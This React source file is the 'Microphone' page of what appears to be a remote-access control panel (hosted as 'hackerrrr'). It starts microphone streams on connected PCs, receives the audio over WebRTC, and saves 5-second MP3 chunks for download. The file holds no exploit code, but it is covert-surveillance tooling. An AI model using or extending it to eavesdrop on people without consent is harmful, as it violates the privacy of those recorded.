import { useEffect, useState, useRef, useCallback } from 'react'
import { Mic, Play, Square, Monitor, Volume2, Download } from 'lucide-react'
import { getPCs, startMicrophoneStream, stopStream, getStreamStatus } from '../services/api'
import { createPeerConnection } from '../utils/webrtc'
import lamejs from 'lamejs'

// Get API URL from environment or construct from current location
let API_BASE_URL = import.meta.env.VITE_API_URL
if (!API_BASE_URL && import.meta.env.PROD) {
  const hostname = window.location.hostname
  if (hostname.includes('onrender.com')) {
    const parts = hostname.split('.')
    if (parts[0] === 'hackerrrr-frontend') {
      API_BASE_URL = `https://hackerrrr-backend.${parts.slice(1).join('.')}`
    } else {
      API_BASE_URL = ''
    }
  } else {
    API_BASE_URL = ''
  }
} else if (!API_BASE_URL) {
  API_BASE_URL = 'http://localhost:8000'
}

API_BASE_URL = API_BASE_URL.replace(/\/$/, '')

const WS_BASE_URL = API_BASE_URL 
  ? API_BASE_URL.replace('http://', 'ws://').replace('https://', 'wss://')
  : (window.location.protocol === 'https:' ? 'wss://' : 'ws://') + window.location.host

const Microphone = () => {
  const [pcs, setPCs] = useState([])
  const [selectedPC, setSelectedPC] = useState(null)
  const [streamStatus, setStreamStatus] = useState(null)
  const [loading, setLoading] = useState(false)
  const [audioChunks, setAudioChunks] = useState([])
  const [connectionState, setConnectionState] = useState('disconnected')
  const [isPlaying, setIsPlaying] = useState(false)

  const audioRef = useRef(null)
  const peerConnectionRef = useRef(null)
  const wsRef = useRef(null)
  const connectingRef = useRef(false)
  const audioContextRef = useRef(null)
  const mediaRecorderRef = useRef(null)
  const chunkIntervalRef = useRef(null)
  const chunkCounterRef = useRef(0)

  useEffect(() => {
    loadPCs()
    const interval = setInterval(loadPCs, 3000)
    return () => {
      clearInterval(interval)
      cleanupWebRTC()
    }
  }, [])

  useEffect(() => {
    if (selectedPC && streamStatus?.has_active_stream && streamStatus?.stream_type === 'microphone') {
      if (connectionState === 'disconnected' && !connectingRef.current) {
        console.log('[WebRTC] Stream detected as active, initiating connection...')
        connectToStream(selectedPC)
      }
    } else if (!streamStatus?.has_active_stream && connectionState !== 'disconnected') {
      cleanupWebRTC()
    }
  }, [streamStatus, selectedPC, connectionState])

  useEffect(() => {
    let statusInterval
    if (selectedPC) {
      const fetchStatus = async () => {
        try {
          const status = await getStreamStatus(selectedPC)
          setStreamStatus(status)
        } catch (error) {
          console.error('Error checking stream status:', error)
        }
      }
      fetchStatus()
      statusInterval = setInterval(fetchStatus, 2000)
    }
    return () => clearInterval(statusInterval)
  }, [selectedPC])

  const cleanupWebRTC = useCallback(() => {
    console.log('[WebRTC] Cleaning up WebRTC resources...')
    connectingRef.current = false
    
    if (chunkIntervalRef.current) {
      clearInterval(chunkIntervalRef.current)
      chunkIntervalRef.current = null
    }
    
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      try {
        mediaRecorderRef.current.stop()
      } catch (e) {
        // Ignore errors
      }
      mediaRecorderRef.current = null
    }
    
    if (audioContextRef.current) {
      try {
        audioContextRef.current.close()
      } catch (e) {
        // Ignore errors
      }
      audioContextRef.current = null
    }
    
    if (peerConnectionRef.current) {
      try {
        peerConnectionRef.current.close()
      } catch (e) {
        // Ignore errors
      }
      peerConnectionRef.current = null
    }
    
    if (wsRef.current) {
      try {
        wsRef.current.close()
      } catch (e) {
        // Ignore errors
      }
      wsRef.current = null
    }
    
    if (audioRef.current) {
      audioRef.current.pause()
      audioRef.current.srcObject = null
    }
    
    setIsPlaying(false)
    
    // Clean up audio URLs to prevent memory leaks
    setAudioChunks(prev => {
      prev.forEach(chunk => {
        if (chunk.audioUrl) {
          URL.revokeObjectURL(chunk.audioUrl)
        }
      })
      return []
    })
    
    setConnectionState('disconnected')
  }, [])

  const connectToStream = useCallback(async (pcId) => {
    if (connectingRef.current || (wsRef.current && wsRef.current.readyState === WebSocket.OPEN)) {
      console.log('[WebRTC] Already connecting or connected, skipping...')
      return
    }
    
    connectingRef.current = true
    setConnectionState('connecting')
    console.log(`[WebRTC] Attempting to connect to microphone stream for PC: ${pcId}`)

    try {
      cleanupWebRTC()

      const ws = new WebSocket(`${WS_BASE_URL}/ws/frontend/${pcId}/microphone`)
      wsRef.current = ws

      ws.onopen = () => {
        console.log('[WebRTC] WebSocket connected for signaling')
      }

      ws.onmessage = async (event) => {
        try {
          const data = JSON.parse(event.data)
          await handleSignalingMessage(data, pcId)
        } catch (error) {
          console.error('[WebRTC] Error handling message:', error)
        }
      }

      ws.onerror = (error) => {
        console.error('[WebRTC] WebSocket error:', error)
        setConnectionState('error')
        cleanupWebRTC()
      }

      ws.onclose = () => {
        console.log('[WebRTC] WebSocket closed')
        connectingRef.current = false
        setConnectionState('disconnected')
      }

      // Create peer connection with TURN server support
      const pc = await createPeerConnection({ iceCandidatePoolSize: 10 })
      peerConnectionRef.current = pc

      // Handle incoming audio tracks
      pc.ontrack = (event) => {
        console.log('[WebRTC] ===== AUDIO TRACK RECEIVED =====')
        console.log('[WebRTC] Track kind:', event.track.kind)
        
        if (event.track.kind === 'audio') {
          console.log('[WebRTC] Audio track received!')
          
          if (!audioRef.current) {
            console.error('[WebRTC] audioRef.current is null!')
            return
          }
          
          const stream = event.streams[0] || new MediaStream([event.track])
          
          // Verify stream has audio tracks
          const audioTracks = stream.getAudioTracks()
          console.log('[WebRTC] Audio tracks in stream:', audioTracks.length)
          if (audioTracks.length === 0) {
            console.error('[WebRTC] No audio tracks in stream!')
            return
          }
          
          audioTracks.forEach(track => {
            console.log('[WebRTC] Audio track:', {
              id: track.id,
              enabled: track.enabled,
              muted: track.muted,
              readyState: track.readyState,
              settings: track.getSettings()
            })
          })
          
          audioRef.current.srcObject = stream
          setConnectionState('connected')
          
          // Don't auto-play - user will click play button manually
          console.log('[WebRTC] ✅ Audio stream ready (not auto-playing)')
          
          // Wait a bit for stream to be ready, then process audio into chunks
          setTimeout(() => {
            processAudioChunks(stream)
          }, 500)
        }
      }

      // Handle ICE candidates
      pc.onicecandidate = (event) => {
        if (event.candidate && ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({
            type: 'webrtc_ice_candidate',
            candidate: {
              candidate: event.candidate.candidate,
              sdpMLineIndex: event.candidate.sdpMLineIndex,
              sdpMid: event.candidate.sdpMid
            }
          }))
        }
      }

      pc.onconnectionstatechange = () => {
        console.log('[WebRTC] Connection state changed:', pc.connectionState)
        setConnectionState(pc.connectionState)
        
        if (pc.connectionState === 'failed' || pc.connectionState === 'closed') {
          cleanupWebRTC()
        }
      }

      console.log('[WebRTC] Waiting for offer from server...')

    } catch (error) {
      console.error('[WebRTC] Error connecting to stream:', error)
      connectingRef.current = false
      setConnectionState('error')
      cleanupWebRTC()
    }
  }, [cleanupWebRTC])

  // Function to convert WebM blob to MP3
  const convertToMP3 = useCallback(async (webmBlob) => {
    return new Promise((resolve, reject) => {
      const audioContext = new (window.AudioContext || window.webkitAudioContext)()
      const fileReader = new FileReader()
      
      fileReader.onload = async (e) => {
        try {
          // Decode the WebM audio
          const audioBuffer = await audioContext.decodeAudioData(e.target.result)
          
          // Convert to WAV PCM data
          const samples = audioBuffer.getChannelData(0)
          const sampleRate = audioBuffer.sampleRate
          
          // Convert float samples to 16-bit PCM
          const samples16bit = new Int16Array(samples.length)
          for (let i = 0; i < samples.length; i++) {
            const s = Math.max(-1, Math.min(1, samples[i]))
            samples16bit[i] = s < 0 ? s * 0x8000 : s * 0x7FFF
          }
          
          // Encode to MP3 using lamejs
          const mp3encoder = new lamejs.Mp3Encoder(1, sampleRate, 128) // mono, sampleRate, bitrate
          const sampleBlockSize = 1152
          const mp3Data = []
          
          for (let i = 0; i < samples16bit.length; i += sampleBlockSize) {
            const sampleChunk = samples16bit.subarray(i, i + sampleBlockSize)
            const mp3buf = mp3encoder.encodeBuffer(sampleChunk)
            if (mp3buf.length > 0) {
              mp3Data.push(mp3buf)
            }
          }
          
          // Flush remaining data
          const mp3buf = mp3encoder.flush()
          if (mp3buf.length > 0) {
            mp3Data.push(mp3buf)
          }
          
          // Create MP3 blob
          const mp3Blob = new Blob(mp3Data, { type: 'audio/mpeg' })
          resolve(mp3Blob)
        } catch (error) {
          reject(error)
        }
      }
      
      fileReader.onerror = reject
      fileReader.readAsArrayBuffer(webmBlob)
    })
  }, [])

  const processAudioChunks = useCallback((stream) => {
    try {
      // Verify stream has audio tracks
      const audioTracks = stream.getAudioTracks()
      if (audioTracks.length === 0) {
        console.error('[Audio] Stream has no audio tracks!')
        return
      }
      
      console.log('[Audio] Stream has', audioTracks.length, 'audio track(s)')
      
      // Verify each track is enabled and active
      audioTracks.forEach((track, index) => {
        console.log(`[Audio] Track ${index}:`, {
          id: track.id,
          enabled: track.enabled,
          muted: track.muted,
          readyState: track.readyState,
          kind: track.kind,
          label: track.label,
          settings: track.getSettings()
        })
        
        // Ensure track is enabled
        if (!track.enabled) {
          console.warn(`[Audio] Track ${index} is disabled, enabling...`)
          track.enabled = true
        }
      })
      
      // Monitor track state changes
      audioTracks.forEach((track, index) => {
        track.onended = () => {
          console.warn(`[Audio] Track ${index} ended!`)
        }
        track.onmute = () => {
          console.warn(`[Audio] Track ${index} muted!`)
        }
        track.onunmute = () => {
          console.log(`[Audio] Track ${index} unmuted`)
        }
      })
      
      // Find supported MIME type
      let mimeType = 'audio/webm;codecs=opus'
      if (!MediaRecorder.isTypeSupported(mimeType)) {
        mimeType = 'audio/webm'
        if (!MediaRecorder.isTypeSupported(mimeType)) {
          mimeType = 'audio/mp4'
          if (!MediaRecorder.isTypeSupported(mimeType)) {
            mimeType = '' // Use default
          }
        }
      }
      
      console.log('[Audio] Using MIME type:', mimeType || 'default')
      
      // Create MediaRecorder to capture audio chunks
      const options = mimeType ? { mimeType } : {}
      const mediaRecorder = new MediaRecorder(stream, options)
      mediaRecorderRef.current = mediaRecorder
      
      chunkCounterRef.current = 0
      
      // Use a ref to store recorded chunks so it's accessible in all callbacks
      const recordedChunksRef = { current: [] }
      
      // Handle data available event
      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedChunksRef.current.push(event.data)
          console.log('[Audio] Received audio data chunk:', event.data.size, 'bytes')
        } else {
          console.warn('[Audio] Received empty audio data')
        }
      }
      
      mediaRecorder.onerror = (event) => {
        console.error('[Audio] MediaRecorder error:', event)
      }
      
      mediaRecorder.onstart = () => {
        console.log('[Audio] MediaRecorder started')
        recordedChunksRef.current = [] // Clear chunks when starting
      }
      
      mediaRecorder.onstop = async () => {
        console.log('[Audio] MediaRecorder stopped')
        
        // When stopped, create chunk from all recorded data
        if (recordedChunksRef.current.length > 0) {
          const webmBlob = new Blob(recordedChunksRef.current, { type: mimeType || 'audio/webm' })
          
          // Convert to MP3
          try {
            const mp3Blob = await convertToMP3(webmBlob)
            const audioUrl = URL.createObjectURL(mp3Blob)
            
            const now = new Date()
            const dateStr = now.toISOString().slice(0, 19).replace(/[:.]/g, '-')
            const chunkId = chunkCounterRef.current
            const filename = `audio_chunk_${chunkId}_${dateStr}.mp3`
            
            console.log(`[Audio] Created MP3 chunk ${chunkId} with ${mp3Blob.size} bytes`)
            
            const chunk = {
              id: chunkId,
              timestamp: now.toLocaleTimeString(),
              audioUrl: audioUrl,
              blob: mp3Blob,
              filename: filename
            }
            
            setAudioChunks(prev => [...prev, chunk])
            console.log(`[Audio] Added chunk ${chunk.id} at ${chunk.timestamp}`)
            
            chunkCounterRef.current++
          } catch (error) {
            console.error('[Audio] Error converting to MP3:', error)
            // Fallback to webm if conversion fails
            const audioUrl = URL.createObjectURL(webmBlob)
            const now = new Date()
            const dateStr = now.toISOString().slice(0, 19).replace(/[:.]/g, '-')
            const chunkId = chunkCounterRef.current
            const filename = `audio_chunk_${chunkId}_${dateStr}.webm`
            
            const chunk = {
              id: chunkId,
              timestamp: now.toLocaleTimeString(),
              audioUrl: audioUrl,
              blob: webmBlob,
              filename: filename
            }
            
            setAudioChunks(prev => [...prev, chunk])
            chunkCounterRef.current++
          }
        } else {
          console.warn('[Audio] No audio data recorded in this chunk')
        }
      }
      
      // Verify MediaRecorder is ready
      console.log('[Audio] MediaRecorder state:', mediaRecorder.state)
      console.log('[Audio] MediaRecorder mimeType:', mediaRecorder.mimeType)
      
      // Start recording (no timeslice - we'll manually stop/start every 5 seconds)
      if (mediaRecorder.state === 'inactive') {
        try {
          mediaRecorder.start()
          console.log('[Audio] ✅ Started recording audio')
          console.log('[Audio] MediaRecorder state after start:', mediaRecorder.state)
        } catch (error) {
          console.error('[Audio] Error starting MediaRecorder:', error)
          throw error
        }
      } else {
        console.warn('[Audio] MediaRecorder is not inactive, state:', mediaRecorder.state)
      }
      
      // Set up interval to stop and restart recording every 5 seconds
      // This ensures we get complete 5-second chunks
      chunkIntervalRef.current = setInterval(() => {
        if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
          console.log('[Audio] Stopping recording to create chunk...')
          mediaRecorderRef.current.stop()
          
          // Restart recording after a brief delay
          setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'inactive') {
              try {
                mediaRecorderRef.current.start()
                console.log('[Audio] Restarted recording for next chunk')
              } catch (error) {
                console.error('[Audio] Error restarting MediaRecorder:', error)
              }
            }
          }, 100)
        }
      }, 5000) // Every 5 seconds
      
    } catch (error) {
      console.error('[Audio] Error processing audio chunks:', error)
      console.error('[Audio] Error details:', error.message, error.stack)
    }
  }, [convertToMP3])

  const handleSignalingMessage = useCallback(async (data, pcId) => {
    const pc = peerConnectionRef.current
    if (!pc) return

    try {
      if (data.type === 'webrtc_offer') {
        await pc.setRemoteDescription(new RTCSessionDescription({
          type: 'offer',
          sdp: data.sdp
        }))
        
        const answer = await pc.createAnswer()
        await pc.setLocalDescription(answer)
        
        if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
          wsRef.current.send(JSON.stringify({
            type: 'webrtc_answer',
            sdp: answer.sdp
          }))
        }
        console.log('[WebRTC] Answer sent, connection in progress...')
      } else if (data.type === 'webrtc_ice_candidate') {
        if (data.candidate) {
          await pc.addIceCandidate(new RTCIceCandidate({
            candidate: data.candidate.candidate,
            sdpMLineIndex: data.candidate.sdpMLineIndex,
            sdpMid: data.candidate.sdpMid
          }))
        }
      } else if (data.type === 'webrtc_error') {
        console.error('[WebRTC] Error from server:', data.message)
        setConnectionState('error')
        cleanupWebRTC()
      }
    } catch (error) {
      console.error('[WebRTC] Error handling signaling message:', error)
    }
  }, [cleanupWebRTC])

  const loadPCs = async () => {
    try {
      const data = await getPCs(true)
      setPCs(data.pcs || [])
    } catch (error) {
      console.error('Error loading PCs:', error)
    }
  }

  const handleStartStream = async () => {
    if (!selectedPC) {
      alert('Please select a PC')
      return
    }
    setLoading(true)
    try {
      await startMicrophoneStream(selectedPC)
      setAudioChunks([]) // Reset chunks
      chunkCounterRef.current = 0
    } catch (error) {
      alert('Error starting microphone stream: ' + (error.response?.data?.detail || error.message))
    } finally {
      setLoading(false)
    }
  }

  const handleStopStream = async () => {
    if (!selectedPC) return
    setLoading(true)
    try {
      await stopStream(selectedPC)
      cleanupWebRTC()
    } catch (error) {
      alert('Error stopping stream: ' + (error.response?.data?.detail || error.message))
    } finally {
      setLoading(false)
    }
  }

  const isStreaming = streamStatus?.has_active_stream && streamStatus?.stream_type === 'microphone'

  return (
    <div className="min-h-screen bg-black p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl p-6 shadow-2xl">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="p-3 bg-hack-green/10 rounded-lg border border-hack-green/20">
                <Mic className="text-hack-green" size={28} />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-white">Microphone Stream</h1>
                <p className="text-white/70 text-sm mt-1">Monitor and record audio from connected devices</p>
              </div>
            </div>
            {isStreaming && (
              <div className="flex items-center gap-2 px-4 py-2 bg-green-500/10 border border-green-500/30 rounded-lg">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span className="text-green-400 font-medium text-sm">LIVE</span>
              </div>
            )}
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Left Sidebar - PC Selection & Controls */}
          <div className="lg:col-span-4 space-y-6">
            {/* PC Selection Card */}
            <div className="bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl p-6 shadow-xl">
              <div className="flex items-center gap-3 mb-6">
                <Monitor className="text-hack-green" size={20} />
                <h2 className="text-lg font-semibold text-white">Connected Devices</h2>
              </div>
              <div className="space-y-2 max-h-80 overflow-y-auto custom-scrollbar">
                {pcs.length === 0 ? (
                  <div className="text-center py-8">
                    <p className="text-white/50 text-sm">No devices connected</p>
                  </div>
                ) : (
                  pcs.map((pc) => (
                    <button
                      key={pc.pc_id}
                      onClick={() => {
                        setSelectedPC(pc.pc_id)
                        cleanupWebRTC()
                      }}
                      className={`w-full text-left p-4 rounded-lg border transition-all duration-200 ${
                        selectedPC === pc.pc_id
                          ? 'bg-hack-green/10 border-hack-green/50 text-hack-green shadow-lg shadow-hack-green/20'
                          : 'bg-black/50 border-white/10 text-white hover:border-hack-green/30 hover:bg-black/70'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <div className={`p-2 rounded ${selectedPC === pc.pc_id ? 'bg-hack-green/20' : 'bg-black/50'}`}>
                          <Monitor size={16} className={selectedPC === pc.pc_id ? 'text-hack-green' : 'text-white/70'} />
                        </div>
                        <span className="font-medium">{pc.pc_id}</span>
                      </div>
                    </button>
                  ))
                )}
              </div>
            </div>

            {/* Controls Card */}
            {selectedPC && (
              <div className="bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl p-6 shadow-xl">
                <h2 className="text-lg font-semibold text-white mb-6">Stream Controls</h2>
                <div className="space-y-3">
                  {!isStreaming ? (
                    <button
                      onClick={handleStartStream}
                      disabled={loading}
                      className="w-full bg-gradient-to-r from-hack-green/20 to-green-600/20 hover:from-hack-green/30 hover:to-green-600/30 border border-hack-green/50 text-hack-green px-6 py-4 rounded-lg font-medium transition-all flex items-center justify-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg shadow-hack-green/20"
                    >
                      <Play size={20} />
                      <span>Start Recording</span>
                    </button>
                  ) : (
                    <button
                      onClick={handleStopStream}
                      disabled={loading}
                      className="w-full bg-gradient-to-r from-red-500/20 to-red-600/20 hover:from-red-500/30 hover:to-red-600/30 border border-red-500/50 text-red-400 px-6 py-4 rounded-lg font-medium transition-all flex items-center justify-center gap-3 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg shadow-red-500/20"
                    >
                      <Square size={20} />
                      <span>Stop Recording</span>
                    </button>
                  )}
                </div>
              </div>
            )}

            {/* Status Card */}
            {selectedPC && streamStatus && (
              <div className="bg-hack-dark/90 backdrop-blur-sm border border-white/10 rounded-xl p-6 shadow-xl">
                <h2 className="text-lg font-semibold text-white mb-6">Stream Status</h2>
                <div className="space-y-4">
                  <div className="flex justify-between items-center py-2 border-b border-white/10">
                    <span className="text-white/70 text-sm">Stream Type</span>
                    <span className="text-white font-medium">
                      {streamStatus.stream_type ? streamStatus.stream_type.charAt(0).toUpperCase() + streamStatus.stream_type.slice(1) : 'None'}
                    </span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-white/10">
                    <span className="text-white/70 text-sm">Status</span>
                    <span className={`font-medium ${isStreaming ? 'text-hack-green' : 'text-white/50'}`}>
                      {isStreaming ? 'Active' : 'Inactive'}
                    </span>
                  </div>
                  <div className="flex justify-between items-center py-2 border-b border-white/10">
                    <span className="text-white/70 text-sm">Connection</span>
                    <span className={`font-medium ${
                      connectionState === 'connected' ? 'text-hack-green' :
                      connectionState === 'connecting' ? 'text-hack-green' :
                      connectionState === 'error' ? 'text-red-400' :
                      'text-white/50'
                    }`}>
                      {connectionState.charAt(0).toUpperCase() + connectionState.slice(1)}
                    </span>
                  </div>
                  <div className="flex justify-between items-center py-2">
                    <span className="text-white/70 text-sm">Chunk Duration</span>
                    <span className="text-white font-medium">5 seconds</span>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Right Side - Audio Display */}
          <div className="lg:col-span-8">
            <div className="bg-black backdrop-blur-sm border border-white/10 rounded-xl overflow-hidden shadow-xl">
              {!selectedPC ? (
                <div className="min-h-[300px] sm:min-h-[500px] flex items-center justify-center p-8">
                  <div className="text-center">
                    <Mic className="mx-auto text-white/30 mb-4" size={48} />
                    <p className="text-white font-medium">Select a PC to view microphone</p>
                  </div>
                </div>
              ) : !isStreaming ? (
                <div className="min-h-[300px] sm:min-h-[500px] flex items-center justify-center p-8">
                  <div className="text-center">
                    <Mic className="mx-auto text-white/30 mb-4" size={48} />
                    <p className="text-white font-medium">Microphone stream not active</p>
                    <p className="text-white/50 text-sm mt-2">Click "Start Recording" to begin</p>
                  </div>
                </div>
              ) : connectionState === 'connecting' ? (
                <div className="min-h-[300px] sm:min-h-[500px] flex items-center justify-center p-8">
                  <div className="text-center">
                    <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-hack-green mx-auto mb-4"></div>
                    <p className="text-white font-medium">Establishing WebRTC connection...</p>
                  </div>
                </div>
              ) : (
                <div className="space-y-6 p-6">
                  {/* Live Stream Header */}
                  <div className="flex items-center justify-between pb-4 border-b border-white/10">
                    <div className="flex items-center gap-3">
                      <div className="p-2 bg-green-500/10 rounded-lg border border-green-500/30">
                        <Volume2 className="text-green-400" size={20} />
                      </div>
                      <div>
                        <h3 className="text-lg font-semibold text-white">Live Audio Stream</h3>
                        <p className="text-white/70 text-sm">Recording from {selectedPC}</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2 px-3 py-1.5 bg-green-500/10 border border-green-500/30 rounded-lg">
                      <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                      <span className="text-green-400 text-sm font-medium">RECORDING</span>
                    </div>
                  </div>
                  
                  {/* Live Audio Controls */}
                  <div className="mb-6 p-4 bg-black/50 border border-white/10 rounded-lg">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-white/70 text-sm mb-2">Live Audio Stream</p>
                        <p className="text-white text-xs font-mono">Click play to listen to live audio</p>
                      </div>
                      <button
                        onClick={() => {
                          if (audioRef.current) {
                            if (isPlaying) {
                              audioRef.current.pause()
                              setIsPlaying(false)
                            } else {
                              audioRef.current.play().then(() => {
                                setIsPlaying(true)
                                console.log('[Audio] Live audio playing')
                              }).catch((error) => {
                                console.error('[Audio] Error playing live audio:', error)
                                setIsPlaying(false)
                              })
                            }
                          }
                        }}
                        className={`px-6 py-3 rounded-lg font-medium transition-all flex items-center gap-2 ${
                          isPlaying
                            ? 'bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-red-400'
                            : 'bg-hack-green/10 hover:bg-hack-green/20 border border-hack-green/30 text-hack-green'
                        }`}
                      >
                        {isPlaying ? <Square size={18} /> : <Play size={18} />}
                        {isPlaying ? 'Stop' : 'Play Live Audio'}
                      </button>
                    </div>
                  </div>
                  
                  {/* Hidden audio element for live playback - no autoplay */}
                  <audio 
                    ref={audioRef} 
                    playsInline 
                    className="hidden"
                    onPlay={() => setIsPlaying(true)}
                    onPause={() => setIsPlaying(false)}
                    onEnded={() => setIsPlaying(false)}
                  />
                  
                  {/* Audio Chunks Section */}
                  <div>
                    <div className="flex items-center justify-between mb-4">
                      <h4 className="text-md font-semibold text-white">Recorded Chunks</h4>
                      <span className="text-white/70 text-sm">{audioChunks.length} chunk{audioChunks.length !== 1 ? 's' : ''}</span>
                    </div>
                    
                    <div className="space-y-4 max-h-[500px] overflow-y-auto custom-scrollbar pr-2">
                      {audioChunks.length === 0 ? (
                        <div className="text-center py-12 border-2 border-dashed border-white/10 rounded-lg bg-black/50">
                          <Mic className="mx-auto text-white/30 mb-3" size={32} />
                          <p className="text-white/50 text-sm">Audio chunks will appear here</p>
                          <p className="text-white/30 text-xs mt-1">Chunks are created every 5 seconds</p>
                        </div>
                      ) : (
                        audioChunks.map((chunk) => (
                          <div
                            key={chunk.id}
                            className="bg-black/50 border border-white/10 rounded-lg p-5 hover:border-hack-green/30 transition-all shadow-lg"
                          >
                            {/* Chunk Header */}
                            <div className="flex justify-between items-center mb-4">
                              <div className="flex items-center gap-3">
                                <div className="px-3 py-1 bg-hack-green/10 border border-hack-green/30 rounded text-hack-green text-sm font-medium">
                                  #{chunk.id + 1}
                                </div>
                                <span className="text-white/70 text-sm">{chunk.timestamp}</span>
                              </div>
                              {chunk.blob && (
                                <span className="text-white/50 text-xs bg-black/50 px-2 py-1 rounded">
                                  {(chunk.blob.size / 1024).toFixed(1)} KB
                                </span>
                              )}
                            </div>
                            
                            {/* Audio Player */}
                            {chunk.audioUrl ? (
                              <div className="space-y-3">
                                <div className="bg-black/50 rounded-lg p-3 border border-white/10">
                                  <audio
                                    controls
                                    src={chunk.audioUrl}
                                    className="w-full"
                                    preload="metadata"
                                    style={{
                                      height: '40px',
                                      filter: 'invert(1) hue-rotate(180deg) brightness(0.9)',
                                    }}
                                  >
                                    Your browser does not support the audio element.
                                  </audio>
                                </div>
                                
                                {/* Download Button */}
                                <button
                                  onClick={() => {
                                    const link = document.createElement('a')
                                    link.href = chunk.audioUrl
                                    link.download = chunk.filename || `chunk_${chunk.id}.mp3`
                                    link.style.display = 'none'
                                    document.body.appendChild(link)
                                    link.click()
                                    setTimeout(() => {
                                      document.body.removeChild(link)
                                    }, 100)
                                  }}
                                  className="w-full bg-hack-green/10 hover:bg-hack-green/20 border border-hack-green/30 text-hack-green px-4 py-2.5 rounded-lg font-medium transition-all flex items-center justify-center gap-2 text-sm"
                                >
                                  <Download size={16} />
                                  Download MP3
                                </button>
                              </div>
                            ) : (
                              <div className="text-center py-4">
                                <span className="text-white/50 text-sm">Processing audio...</span>
                              </div>
                            )}
                          </div>
                        ))
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

export default Microphone
